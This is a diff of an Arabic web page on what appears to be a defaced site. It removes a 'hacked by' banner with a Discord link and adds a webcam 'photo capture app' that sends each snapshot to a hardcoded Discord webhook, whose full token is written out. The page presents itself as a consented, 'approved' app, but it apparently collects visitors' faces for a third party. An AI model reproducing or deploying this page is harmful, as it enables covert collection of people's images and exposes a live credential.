@@ -2,86 +2,75 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>@arix & @karen</title>
+    <title>تطبيق التقاط الصور بموافقة المستخدم</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body, html {
-            height: 100%;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #000;
-            overflow: hidden;
-            font-family: 'Arial', sans-serif;
-        }
-
-        /* الطبقة التي تحمل الصورة */
-        .bg-image {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            /* استخدمت هنا الرابط المباشر للملف لضمان التشغيل */
-            background-image: url('https://i.postimg.cc/NfczbbPN/8aa9c790-1cff-4e55-9aa4-4888d8703064.png');
-            background-repeat: no-repeat;
-            background-position: center center;
-            background-size: cover;
-            filter: brightness(0.6);
-            z-index: -1;
-        }
-
-        .container {
-            text-align: center;
-            animation: fadeIn 2s ease-in-out;
-        }
-
-        .names {
-            font-size: 4.5rem;
-            font-weight: bold;
-            color: #ffffff;
-            text-shadow: 0 0 20px #ff0000, 0 0 40px rgba(0,0,0,0.8);
-            margin-bottom: 5px;
-        }
-
-        .discord-text {
-            font-size: 1.8rem;
-            color: rgba(255, 255, 255, 0.8);
-            text-decoration: none;
-            letter-spacing: 5px;
-            font-weight: 300;
-            transition: 0.5s;
-            display: block;
-            text-shadow: 0 0 10px rgba(0,0,0,1);
-        }
-
-        .discord-text:hover {
-            color: #ff0000;
-            letter-spacing: 10px;
-            text-shadow: 0 0 20px #ff0000;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        video, canvas { border: 2px solid #333; border-radius: 8px; max-width: 100%; }
+        button { padding: 10px 20px; font-size: 16px; margin-top: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="bg-image"></div>
+    <h2>تطبيق التقاط الصورة الشخصية</h2>
+    <p>يرجى السماح للمتصفح بالوصول إلى الكاميرا، ثم اضغط على الزر أدناه لالتقاط الصورة.</p>
 
-    <div class="container">
-        <div class="names">hacked by @arix & @karen</div>
-        <a href="https://discord.gg/ove" target="_blank" class="discord-text">discord.gg/ove</a>
-    </div>
+    <!-- عرض بث الكاميرا الحي للمركّب -->
+    <video id="video" width="640" height="480" autoplay></video><br>
+    
+    <button id="capture-btn">التقاط وإرسال الصورة</button>
+    
+    <!-- عنصر مخفي لمعالجة الصورة وتحويلها إلى بيانات -->
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('capture-btn');
+        const webhookUrl = 'https://discord.com/api/webhooks/1506731264693108899/jZq_aAkMWzV3hDDPozh3e2qrlD2fEtUqWq91zE8w61iH8zh6RQYlWlSWPpW7uhmTeep_'; // ضع رابط الاستقبال الآمن هنا
+
+        // 1. طلب إذن الكاميرا بشكل رسمي من المستخدم
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("رفض المستخدم الإذن أو الكاميرا غير متوفرة: ", err);
+                alert("لا يمكن تشغيل التطبيق بدون منح إذن الكاميرا.");
+            });
+
+        // 2. التقاط الصورة عند الضغط على الزر
+        captureButton.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            // رسم اللقطة الحالية من الفيديو داخل الـ canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة إلى صيغة Blob (ملف ثنائي) لإرسالها
+            canvas.toBlob(blob => {
+                if (!blob) return;
+
+                // إعداد البيانات لإرسالها كملف (FormData)
+                const formData = new FormData();
+                formData.append('files[0]', blob, 'captured-image.png');
+                formData.append('username', 'تطبيق الكاميرا المعتمد');
+
+                // 3. إرسال الصورة عبر تقنية Fetch API
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("تم التقاط الصورة وإرسالها بنجاح بموافقتك!");
+                    } else {
+                        alert("حدث خطأ أثناء الإرسال.");
+                    }
+                })
+                .catch(error => {
+                    console.error("خطأ في الشبكة:", error);
+                });
+            }, 'image/png');
+        });
+    </script>
 
 </body>
 </html>
